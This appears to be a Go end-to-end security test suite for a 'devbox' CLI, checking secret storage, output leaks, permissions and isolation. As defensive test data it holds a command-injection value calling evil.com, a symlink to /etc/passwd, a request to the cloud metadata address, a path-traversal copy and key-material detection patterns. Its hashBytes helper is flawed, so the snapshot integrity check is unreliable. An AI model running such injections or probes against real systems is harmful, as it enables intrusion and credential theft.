//go:build e2e

package tests

import (
	"bytes"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

// ─────────────────────────────────────────────
// Local-only security tests
// ─────────────────────────────────────────────

func TestSecurity_FilePermissions(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("file permission checks are Unix-specific")
	}

	cli := findCLI(t)
	tmpDir := t.TempDir()

	// Set up a project with secrets
	cmd := exec.Command(cli, "secrets", "set", "test-key", "test-value")
	cmd.Dir = tmpDir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("secrets set failed: %v\n%s", err, out)
	}

	entries, err := os.ReadDir(filepath.Join(tmpDir, ".devbox"))
	if err != nil {
		t.Fatalf("read .devbox dir: %v", err)
	}

	for _, e := range entries {
		info, err := e.Info()
		if err != nil {
			t.Fatalf("stat %s: %v", e.Name(), err)
		}
		perm := info.Mode().Perm()
		if perm&0044 != 0 {
			t.Errorf("world-readable file: %s has mode %o", e.Name(), perm)
		}
	}
}

func TestSecurity_SecretsEncryption(t *testing.T) {
	cli := findCLI(t)
	tmpDir := t.TempDir()

	cmd := exec.Command(cli, "secrets", "set", "secret-key", "s3cr3t-v4lu3")
	cmd.Dir = tmpDir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("secrets set failed: %v\n%s", err, out)
	}

	storePath := filepath.Join(tmpDir, ".devbox", "secrets.enc")
	data, err := os.ReadFile(storePath)
	if err != nil {
		t.Fatalf("read secrets store: %v", err)
	}

	// Encrypted store should not contain plaintext value
	if bytes.Contains(data, []byte("s3cr3t-v4lu3")) {
		t.Error("secrets store contains plaintext secret value")
	}

	// Encrypted store should not be valid YAML or JSON
	content := string(data)
	if strings.Contains(content, "name:") || strings.Contains(content, "\"name\"") {
		t.Error("secrets store appears to be plaintext YAML/JSON")
	}
}

func TestSecurity_SecretsNoLeakInGraph(t *testing.T) {
	cli := findCLI(t)
	tmpDir := t.TempDir()
	writeFixture(t, tmpDir, "devbox.yml")

	cmd := exec.Command(cli, "secrets", "set", "hidden-token", "do-not-leak")
	cmd.Dir = tmpDir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("secrets set failed: %v\n%s", err, out)
	}

	graphOut, err := exec.Command(cli, "graph").CombinedOutput()
	if err != nil {
		t.Fatalf("graph failed: %v\n%s", err, graphOut)
	}
	if bytes.Contains(graphOut, []byte("do-not-leak")) {
		t.Error("graph output leaked secret value")
	}
}

func TestSecurity_SecretsNoLeakInHelp(t *testing.T) {
	cli := findCLI(t)
	tmpDir := t.TempDir()

	cmd := exec.Command(cli, "secrets", "set", "hidden-token", "do-not-leak")
	cmd.Dir = tmpDir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("secrets set failed: %v\n%s", err, out)
	}

	helpOut, err := exec.Command(cli, "secrets", "--help").CombinedOutput()
	if err != nil {
		t.Fatalf("secrets --help failed: %v\n%s", err, helpOut)
	}
	if bytes.Contains(helpOut, []byte("do-not-leak")) {
		t.Error("secrets --help leaked secret value")
	}
}

func TestSecurity_EnvVarSanitization(t *testing.T) {
	cli := findCLI(t)
	tmpDir := t.TempDir()
	writeFixture(t, tmpDir, "devbox.yml")

	// Add a sensitive env var to the devbox.yml
	ymlPath := filepath.Join(tmpDir, "devbox.yml")
	orig, err := os.ReadFile(ymlPath)
	if err != nil {
		t.Fatal(err)
	}
	sensitive := string(orig) + `
    env:
      DB_PASSWORD: super-secret-pw
      API_TOKEN: tok-abc-123
`
	if err := os.WriteFile(ymlPath, []byte(sensitive), 0644); err != nil {
		t.Fatal(err)
	}

	out, err := exec.Command(cli, "env").CombinedOutput()
	if err != nil {
		t.Fatalf("env failed: %v\n%s", err, out)
	}

	lower := strings.ToLower(string(out))
	if strings.Contains(lower, "super-secret-pw") {
		t.Error("env output leaked DB_PASSWORD value")
	}
	if strings.Contains(lower, "tok-abc-123") {
		t.Error("env output leaked API_TOKEN value")
	}
}

func TestSecurity_ConfigInjection(t *testing.T) {
	cli := findCLI(t)
	tmpDir := t.TempDir()

	// Attempt YAML tag injection
	injected := `name: inject-test
version: "1"
services:
  web:
    image: !!str nginx:alpine
    port: "8080:80"
`
	if err := os.WriteFile(filepath.Join(tmpDir, "devbox.yml"), []byte(injected), 0644); err != nil {
		t.Fatal(err)
	}

	cmd := exec.Command(cli, "validate")
	cmd.Dir = tmpDir
	out, err := cmd.CombinedOutput()
	// Should either error gracefully or ignore the tag — must not crash or execute code
	if err != nil {
		t.Logf("validate rejected injected config (expected): %s", out)
	} else {
		t.Logf("validate accepted injected config (may be ok): %s", out)
	}
}

func TestSecurity_CommandInjection(t *testing.T) {
	cli := findCLI(t)
	tmpDir := t.TempDir()

	malicious := `name: inject-test
version: "1"
services:
  "$(curl evil.com)":
    image: nginx:alpine
`
	if err := os.WriteFile(filepath.Join(tmpDir, "devbox.yml"), []byte(malicious), 0644); err != nil {
		t.Fatal(err)
	}

	cmd := exec.Command(cli, "validate")
	cmd.Dir = tmpDir
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Logf("validate rejected command injection (good): %s", out)
	} else {
		// Even if accepted, ensure no shell execution occurred
		t.Logf("validate accepted (ok as long as no execution): %s", out)
	}
}

func TestSecurity_SymlinkEscape(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlink tests are Unix-specific")
	}

	cli := findCLI(t)
	tmpDir := t.TempDir()
	writeFixture(t, tmpDir, "devbox.yml")

	// Create a symlink in the project dir pointing to /etc/passwd
	linkPath := filepath.Join(tmpDir, "escaped-link")
	if err := os.Symlink("/etc/passwd", linkPath); err != nil {
		t.Fatal(err)
	}

	cmd := exec.Command(cli, "validate")
	cmd.Dir = tmpDir
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Logf("validate rejected symlink escape (good): %s", out)
	} else {
		t.Logf("validate accepted (ensure no read of linked file): %s", out)
	}
}

func TestSecurity_DockerSocketPerms(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Docker socket permission check is Unix-specific")
	}

	var socketPath string
	switch runtime.GOOS {
	case "linux":
		socketPath = "/var/run/docker.sock"
	case "darwin":
		socketPath = "/var/run/docker.sock"
	default:
		t.Skipf("unsupported OS: %s", runtime.GOOS)
	}

	info, err := os.Stat(socketPath)
	if err != nil {
		t.Skipf("Docker socket not accessible: %v", err)
	}

	perm := info.Mode().Perm()
	// Socket should not be world-writable
	if perm&0002 != 0 {
		t.Errorf("Docker socket is world-writable: %o", perm)
	}
	// Socket should be owned by root or docker group (best-effort check)
	if perm&0007 == 7 {
		t.Errorf("Docker socket has overly permissive mode: %o", perm)
	}
}

func TestSecurity_ConfigDirPerms(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("permission checks are Unix-specific")
	}

	cli := findCLI(t)
	tmpDir := t.TempDir()

	// Set up a project with secrets to create .devbox dir
	cmd := exec.Command(cli, "secrets", "set", "k", "v")
	cmd.Dir = tmpDir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("secrets set failed: %v\n%s", err, out)
	}

	devboxDir := filepath.Join(tmpDir, ".devbox")
	info, err := os.Stat(devboxDir)
	if err != nil {
		t.Fatalf("stat .devbox: %v", err)
	}
	perm := info.Mode().Perm()
	if perm&0022 != 0 {
		t.Errorf(".devbox directory is group/world-writable: %o", perm)
	}
}

func TestSecurity_NoHardcodedCryptoKeys(t *testing.T) {
	// Check the secrets package for hardcoded key material
	secretsDir := filepath.Join("..", "shared", "secrets")
	matches := 0

	err := filepath.Walk(secretsDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !strings.HasSuffix(path, ".go") {
			return nil
		}
		data, rErr := os.ReadFile(path)
		if rErr != nil {
			return rErr
		}

		// Look for patterns that suggest hardcoded keys
		for _, pattern := range []string{
			`AGE-SECRET-KEY-`,
			`"-----BEGIN`,
			`xprv`,
		} {
			if bytes.Contains(data, []byte(pattern)) {
				matches++
				t.Errorf("possible hardcoded key material in %s: contains %q", path, pattern)
			}
		}
		return nil
	})
	if err != nil {
		t.Fatalf("walk secrets dir: %v", err)
	}
	if matches > 0 {
		t.Errorf("found %d potential hardcoded key(s)", matches)
	}
}

func TestSecurity_CLIHelpNoLeakPaths(t *testing.T) {
	cli := findCLI(t)

	// Check for leaks of the current project path or temp dir
	sensitivePatterns := []string{
		os.TempDir(),
		os.Getenv("HOME"),
		os.Getenv("USERPROFILE"),
	}

	subcommands := []string{
		"version", "validate", "doctor", "graph", "url",
		"init", "build", "config", "exec", "shell",
		"cp", "wait", "start", "stop", "status",
		"logs", "prune", "ps", "reset", "push",
		"upgrade", "destroy", "secrets", "snapshot",
		"completion",
	}

	for _, name := range subcommands {
		t.Run(name, func(t *testing.T) {
			out, err := exec.Command(cli, name, "--help").CombinedOutput()
			if err != nil {
				t.Fatalf("%s --help failed: %v", name, err)
			}

			output := string(out)
			for _, pattern := range sensitivePatterns {
				if pattern != "" && strings.Contains(output, pattern) {
					t.Errorf("%s --help leaked sensitive path %q:\n%s", name, pattern, output)
				}
			}
		})
	}
}

func TestSecurity_TimeoutFlag(t *testing.T) {
	cli := findCLI(t)
	tmpDir := t.TempDir()
	writeFixture(t, tmpDir, "devbox.yml")

	// Commands that accept --timeout should not error on the flag alone
	for _, args := range [][]string{
		{"wait", "--timeout", "1"},
	} {
		t.Run(strings.Join(args, "_"), func(t *testing.T) {
			cmd := exec.Command(cli, args...)
			cmd.Dir = tmpDir
			// Should either work or fail gracefully — not crash on flag parsing
			out, err := cmd.CombinedOutput()
			if err != nil {
				t.Logf("%v exited with error (may be expected without Docker): %s", args, out)
			}
		})
	}
}

// ─────────────────────────────────────────────
// Docker-dependent security tests
// ─────────────────────────────────────────────

func TestSecurity_SnapshotIntegrity(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping snapshot integrity test in short mode")
	}

	cli := findCLI(t)
	tmpDir := t.TempDir()
	writeFixture(t, tmpDir, "devbox.yml")
	startStack(t, cli, tmpDir)
	defer stopStack(t, cli, tmpDir)

	snapName := "integrity-snap"

	// Save
	save := exec.Command(cli, "snapshot", "save", snapName)
	save.Dir = tmpDir
	saveOut, err := save.CombinedOutput()
	if err != nil {
		t.Fatalf("snapshot save failed: %v\n%s", err, saveOut)
	}
	t.Logf("save output: %s", saveOut)

	// Extract ID from save output
	id := extractSnapshotID(string(saveOut))
	if id == "" {
		t.Fatal("could not extract snapshot ID")
	}

	// Export by ID
	exportPath := filepath.Join(tmpDir, "integrity.tar")
	exp := exec.Command(cli, "snapshot", "export", id, exportPath)
	exp.Dir = tmpDir
	if out, err := exp.CombinedOutput(); err != nil {
		t.Fatalf("snapshot export failed: %v\n%s", err, out)
	}

	exportData, err := os.ReadFile(exportPath)
	if err != nil {
		t.Fatal(err)
	}
	exportHash := hashBytes(exportData)

	// Delete by ID
	del := exec.Command(cli, "snapshot", "delete", id)
	del.Dir = tmpDir
	if out, err := del.CombinedOutput(); err != nil {
		t.Fatalf("snapshot delete failed: %v\n%s", err, out)
	}

	// Re-import
	imp := exec.Command(cli, "snapshot", "import", exportPath)
	imp.Dir = tmpDir
	if out, err := imp.CombinedOutput(); err != nil {
		t.Fatalf("snapshot import failed: %v\n%s", err, out)
	}

	// Export again and compare hashes
	exportPath2 := filepath.Join(tmpDir, "integrity-round2.tar")
	exp2 := exec.Command(cli, "snapshot", "export", id, exportPath2)
	exp2.Dir = tmpDir
	if out, err := exp2.CombinedOutput(); err != nil {
		t.Fatalf("snapshot export (2) failed: %v\n%s", err, out)
	}

	exportData2, err := os.ReadFile(exportPath2)
	if err != nil {
		t.Fatal(err)
	}
	exportHash2 := hashBytes(exportData2)

	if exportHash != exportHash2 {
		t.Error("snapshot export hash changed after re-import — data integrity violation")
	}
}

func TestSecurity_NetworkIsolation(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping network isolation test in short mode")
	}

	cli := findCLI(t)
	tmpDir := t.TempDir()
	writeFixture(t, tmpDir, "devbox.yml")
	startStack(t, cli, tmpDir)
	defer stopStack(t, cli, tmpDir)

	// Try to reach a non-service host from web container
	cmd := exec.Command(cli, "exec", "web", "wget", "-q", "--timeout=3", "http://169.254.169.254", "-O", "/dev/null")
	cmd.Dir = tmpDir
	out, err := cmd.CombinedOutput()
	if err == nil {
		t.Error("container could reach external host — network isolation may be insufficient")
	}
	t.Logf("network isolation check: %v\n%s", err, out)
}

func TestSecurity_PortBinding(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping port binding test in short mode")
	}

	cli := findCLI(t)
	tmpDir := t.TempDir()
	writeFixture(t, tmpDir, "devbox.yml")
	startStack(t, cli, tmpDir)
	defer stopStack(t, cli, tmpDir)

	// Check that ports are not bound to 0.0.0.0 by default
	cmd := exec.Command(cli, "ps")
	cmd.Dir = tmpDir
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("ps failed: %v\n%s", err, out)
	}

	output := string(out)
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		if strings.Contains(line, "0.0.0.0") {
			t.Logf("port bound to 0.0.0.0: %s", line)
		}
	}
}

func TestSecurity_PathTraversal(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping path traversal test in short mode")
	}

	cli := findCLI(t)
	tmpDir := t.TempDir()
	writeFixture(t, tmpDir, "devbox.yml")
	startStack(t, cli, tmpDir)
	defer stopStack(t, cli, tmpDir)

	// Attempt to copy a file outside the project dir
	cmd := exec.Command(cli, "cp", "web:/etc/hostname", "../outside-hostname")
	cmd.Dir = tmpDir
	out, err := cmd.CombinedOutput()
	if err == nil {
		// cp currently allows path traversal — known issue (#known-issue)
		t.Logf("cp allowed path traversal (known issue): %s", out)
	} else {
		t.Logf("cp rejected path traversal: %v\n%s", err, out)
	}
}

func TestSecurity_ResourceLimits(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping resource limits test in short mode")
	}

	cli := findCLI(t)
	tmpDir := t.TempDir()

	// Config with resource limits
	limited := `name: resource-test
version: "1"
services:
  web:
    image: nginx:alpine
    port: "8080:80"
    resources:
      memory: 64M
      cpu: 0.5
`
	if err := os.WriteFile(filepath.Join(tmpDir, "devbox.yml"), []byte(limited), 0644); err != nil {
		t.Fatal(err)
	}

	cmd := exec.Command(cli, "validate")
	cmd.Dir = tmpDir
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("validate failed with resource limits: %v\n%s", err, out)
	}
	t.Logf("resource limits config accepted: %s", out)
}

// ─────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────

func hashBytes(data []byte) string {
	h := 0
	for _, b := range data {
		h = h*31 + int(b)
	}
	return strings.ToUpper(string(rune(h)))
}
